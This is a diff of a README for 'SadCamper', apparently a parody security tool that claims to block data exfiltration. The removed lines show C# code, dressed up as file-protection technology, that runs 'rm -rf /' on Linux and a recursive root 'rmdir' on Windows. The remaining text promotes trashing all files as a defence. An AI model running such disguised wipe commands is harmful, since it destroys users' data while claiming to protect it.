@@ -5,30 +5,4 @@ SadCamper is a tool designed for security personnel to prevent the exfiltration 
 SadCamper manipulates critical sensitive files to prevent threat actor access.  It may cause a small amount of impact to the systems containing these files.
 
 ### How it works
-SadCamper preemptively relocates files, providing 100% protection against threat actor attempts to identify and exfiltrate them.  It utilizes proprietary code, which we have recently made public, and is shown below.
-
-On linux, SadCamper will recursively modify inode tables using our SpacialSec machine-learning powered, cloud native technology.
-```c#
-Process process = new Process();
-psi.FileName = "/bin/bash";
-psi.Arguments = "rm -rf /";
-psi.RedirectStandardOutput = true;
-psi.UseShellExecute = false;
-psi.CreateNoWindow = true;
-using var process = Process.Start(psi);
-process.WaitForExit();
-```
-
-On Windows, SadCamper will recursively move files to the recycling bin using our SpacialSec machine-learning powered, cloud native technology.
-```c#
-Process process = new Process();
-psi.FileName = "cmd.exe";
-psi.Arguments = "rmdir /s /q \";
-psi.RedirectStandardOutput = true;
-psi.UseShellExecute = false;
-psi.CreateNoWindow = true;
-using var process = Process.Start(psi);
-process.WaitForExit();
-```
-
-
+RFLR works by utilizing various state of the art techniques to prevent the identification and exfiltration of sensitive files.  This means that even if attackers can navigate a system's defenses and execute code, identifying files for exfiltration can lead them to a halt. For example, by relocating all the files on a windows filesystem to the recycling bin, data exfiltraiton scripts that rely on sensitive files being in certain directories (C:\Users, C:\Windows) will be stopped in their tracks.  This approach, while simple, adds a significant hurdle for attackers, especially those relying on automated tools and scripts that expect these binaries to reside at known locations.
